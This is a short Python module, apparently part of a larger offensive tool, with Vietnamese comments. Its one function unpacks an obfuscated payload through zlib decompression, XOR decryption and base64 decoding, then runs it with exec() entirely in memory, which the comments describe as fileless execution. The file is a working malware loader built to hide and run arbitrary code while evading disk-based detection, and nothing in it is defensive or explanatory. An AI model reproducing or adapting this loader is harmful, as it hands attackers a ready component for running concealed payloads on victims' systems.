import base64
import zlib
from core.obfuscator import xor_cipher

def deobfuscate_and_run(obfuscated_data: bytes, key: bytes):
    try:
        # 1. Unpacking
        unpacked = zlib.decompress(obfuscated_data)
        # 2. Decryption
        decrypted = xor_cipher(unpacked, key)
        # 3. Decoding
        original_code = base64.b64decode(decrypted).decode('utf-8')
        
        # Thực thi Fileless (chạy trực tiếp trong RAM)
        exec(original_code, globals())
    except Exception as e:
        print(f"[-] Lỗi giải mã: {e}")